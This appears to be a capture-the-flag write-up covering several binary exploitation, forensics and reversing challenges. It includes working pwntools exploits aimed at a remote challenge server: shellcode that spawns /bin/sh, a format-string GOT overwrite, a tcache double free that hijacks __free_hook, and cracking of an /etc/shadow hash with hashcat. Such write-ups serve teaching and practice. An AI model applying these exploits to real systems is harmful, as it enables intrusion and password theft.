# DEVICE CHECK

1)The challenge asks for hash in first argument and then the password in the next input .. If the generated matches with the input hash it gives the password.

2)One of the argument for hash function is string length and the input is read via read syscall. So we can pass nulls in the input and the function to determine string length is strlen() which reads input till it is null terminated.

```c
    sVar3 = read(0,&local_48,0x14);
    if ((int)sVar3 < 0) {
      puts("read error");
      close(0);
    }
    else {
      printf("Input password : ");
      __isoc99_scanf(&DAT_0010221b,local_28);
      local_13 = 0;
      n = strlen((char *)local_28);
      SHA1(local_28,n,local_68);
      iVar1 = strncmp((char *)&local_48,(char *)local_68,0x14);
      if (iVar1 == 0) {
        puts("Password OK");
        system("/bin/cat flag.txt\n");
      }
      else {
        puts("Wrong Password");
      }
      close(0);
```



3)And for string length 0 there is always a same hash getting generated so we take that hash and send it as the first input. And send null as the second input.

```python
#!/usr/bin/env python3


from pwn import *
 

e = ELF("./main")
#r = process("./main")
r = remote("34.100.187.70",1111)
r.sendafter(b"Please wait while we initialize the system...",p64(0x0d4b6b5eeea339da) + p64(0x90186095efbf5532) + p32(0x0907d8af))
r.sendlineafter(b"Input password :",b"\x00" * 20)
r.interactive()
```

# Dumped

1)The binary is compiled with PIE and Full Relro and no other major mitigations present and this program basically gives us a stack pointer leak which gives the address of input buffer.

2)The binary asks for the buffer size and the number is checked whether it is bigger than 0x5c if yes the program exits.. If not the the binary proceeds to asks input from the user with the user supplied size value.

```c
  printf("You are dumping your trash in dumpster number: %p\n",&local_68);
  printf("Enter the size of trash you\'re throwing: ");
  __isoc99_scanf(&DAT_00102082,&local_6c);
  fflush(stdin);
  if (0x5a < (int)local_6c) {
    puts("I cannot accept to much trash in one go!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  printf("Enter your trash: ");
  sVar1 = read(0,&local_68,(ulong)local_6c);
  local_c = (undefined4)sVar1;
  fflush(stdin);
  puts("Dumped your trash.");
  return;
```



3)But the problem arises is when the size input gets read in int format specifier and the check is also done in int data type. But when the size is passed to read to get input buffer it gets typecasted to unsigned long . So we can make a buffer overflow by passing a negative int like - 100 which also satisfies the size under 0x5c and when typecasted becomes very huge size that we can use it make a buffer overflow.

4)As we already have a stack leak which has RWX permissions. We can inject our shellcode onto stack and execute it by returning to it.

```python
#!/usr/bin/env python3



from pwn import * 

context.arch = "amd64"
e = ELF("./dumped")
#r = process("./dumped")
r = remote("34.100.187.70",4444)
r.recvuntil(b"You are dumping your trash in dumpster number: ")
val = int(r.recvline().strip(),16)
print(hex(val))
r.sendline(b"-1")
shellcode = asm('''
        mov rdi,rsp
        mov rsi,0
        mov rdx,0
        mov rax,0x3b
        syscall
        ''')
exploit = shellcode + (b"\x90" * (104 - len(shellcode)))  + p64(val)  + b"/bin/sh\x00"
r.send(exploit)
r.interactive()
```

 # Got2win

1) This binary is compiled with NX ,Stack Canary and Partial Relro. Partial Relro allows us to overwrite the got table to hijack rip control. This is useful because the binary has stack canary to bypass this we need to leak the stack canary. But if we have any arbitrary write condition available we could basically overwrite the got entry with address we want to jump.  

2) This binary also has a win function which gives us a shell when we jump there. But to jump there we need a vuln that basically allows us to do it.

3) When analysing the code the input is read via fgets and the size parameter in fgets is less than the actually buffer size and no way here to overflow the buffer. But the problem arises when the user input is printed with printf.The printf has no format specifiers present . So what we can do is basically pass our format specifiers that allows us to read and write any location of our choosing.

   ```c
     long in_FS_OFFSET;
     char local_118 [264];
     long local_10;
     
     local_10 = *(long *)(in_FS_OFFSET + 0x28);
     printf("Bend the knee Jon, and repeat > ");
     fgets(local_118,0x8f,stdin);
     printf(local_118);
     if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                       /* WARNING: Subroutine does not return */
       __stack_chk_fail();
     }
     return;
   ```

   

4.My first idea was to overwrite the unresolved got address of exit got entry but for that we have to wait untill the alarm of 60 seconds kicks in to execute the exit function which we tampered it to win function via our format string bug. The plan kinda failed. So my next plan was to overwrite the whole puts got entry using the  **%lln** format specifier to modify the whole 64 bit address to win function address.

```python
#!/usr/bin/env python3


from pwn import *
from time import sleep
context.arch = "amd64"
e = ELF("./got2win")
r = remote("34.100.187.70",5555)
exploit = b"%4199151x" + b"         %9$lln" + p64(e.got.puts)
r.sendline(exploit)
r.interactive()
```



# Hidden flag

When viewing the meeting_notes.txt on dumped it mentions about the user waldo. So we take the hash value of waldo user from /etc/shadow file (sha512crypt) using the root perms in dumped chall but it does not contain the flag and after cracking the value we found that the password is deadbeef(hashcat -m 1800 -a 0 hash.hash  /usr/share/wordlists/rockyou.txt) . In got2win chall the user is ctf which does not has the root perms but has the flag . So we need to login to waldo using the cracked password deadbeef and then view the sensitive data.txt file which has the flag.

# Notes

1) This is a classical heap note challenge where we can add ,view and  delete notes. And the libc given for the challenge is 2.31 the standard libc used for the ubuntu 20.04. This libc has tcache enabled which has some ways to exploit by exploiting the tcachebin single linked list. 

2) There is no win function present here in this challenge that allows us to easily jump and get shell. So we have to work our way through to get the shell and get the shell.

3) After analysing the code. There is no code present to null the chunk pointer after freeing the chunk. We don't have an edit option. So we cannot perform a Use after free which makes exploiting this challenge much easier with less steps. So we can basically free the same chunk multiple times and create a double free scenario. But this libc version has a check that prevents double free scenario by checking the second quadword of the tcache chunk with the address of tcache the first chunk in the heap if the check succeeds then it aborts stating that double free detected in tcache2. 

4) But first we need libc leak so that we can tamper the hooks to get RIP control. So we first allocate a huge chunk greater than the tcache limit and then a small chunk to prevent chunk consolidation. And then free the huge chunk and view the chunk to get unsortedbin metadata(libc leak). And then proceed to allocate more tcache size chunks and then free it more than 8 chunks to get past the tcache max amount for a size and ten push it to fastbin and then create a double free scenario by a,b,a to tamper the chunk fd to free_hook and then finally allocate the chunks till we get the free hook and then write it with the address of system and then free the chunk where we written the string **"/bin/sh\x00"** to execute **system("/bin/sh\x00") **.

   ```python
   #!/usr/bin/env python3
   
   
   from pwn import *
   
   
   e = ELF("./notes")
   #r = process("./notes")
   r = remote("34.100.187.70",7777)
   libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
   
   
   def add(index,size,data):
       r.sendlineafter(b"Select an option:",b"a")
       r.sendlineafter(b"page:",f"{index}")
       r.sendlineafter(b"size:",f"{size}")
       r.sendafter(b"note:",data)
   
   def view(index):
       r.sendlineafter(b"Select an option:",b"b")
       r.sendlineafter(b"page:",f"{index}")
       libc_leak = u64(r.recvuntil(b"\x7f").strip().decode('latin-1').ljust(8,'\x00'))
       return libc_leak
   
   def delete(index):
       r.sendlineafter(b"Select an option:",b"d")
       r.sendlineafter(b"page:",f"{index}")
   
   add(0,0x500,b"A" * 0x18)
   add(1,0x18,b"B" * 0x18)
   delete(0)
   libc_base = view(0) - 0x1ecbe0
   log.info("The libc base of the process is " + hex(libc_base))
   for i in range(2,10):
       add(i,0x18,f"{i}" * 0x18)
   for i in range(1,10):
       delete(i)
   delete(8)
   for i in range(0,8):
       add(i,0x18,p64(libc_base + libc.sym.__free_hook))
   add(9,0x18,b"/bin/sh\x00")
   add(10,0x18,b"C" * 0x18)
   #add(11,0x18,b"D" * 0x18)
   add(11,0x18,p64(libc_base + libc.sym.system))
   delete(9)
   r.interactive()
   ```

   



# Neo's Forensic Training 

1) We are basically given a memory dump of a atm machine and get its secret.

2) First of all , I ran strings and grep it with file format nothing came that useful.

3) Then used volatility to analyse the memory dump of the atm machine.

4) First of all, I ran the imageinfo to know about the imageinfo of the dump which is windows 7 service pack 1.

5) Then ran allmost all commands to get the flag. Like mftparser and searched for patterns browsing history of ie,chrome and firefox.

6) Then ran filescan for interesting files to dump. 

7) And finally ran cmdscan with args and found there was  notepad.exe with an argument of base64 encoded string.

8) That looks suspicious and after decoding we get the flag.

# Magically protected 

   1) The challenge was simple we were provided a python 3.7 bytecode compiled file.
   2) We decompiled it by using decompile ++ and then we saw that script where it asks for input password and it creates a hash and then compares the hash with the hash generated from the value in password variable. But it checks whether we gave the same password . So the trick is simple we just have to create the same hash but with different hash.The hash function is no any predefined function just a simple user defined function where we can simply able to create a same hash with different string
   3) Basically we are going to do a hash collision to get the flag .
   4) After testing in the local with the value we created .. We give the input to the remote server to get the flag for the challenge
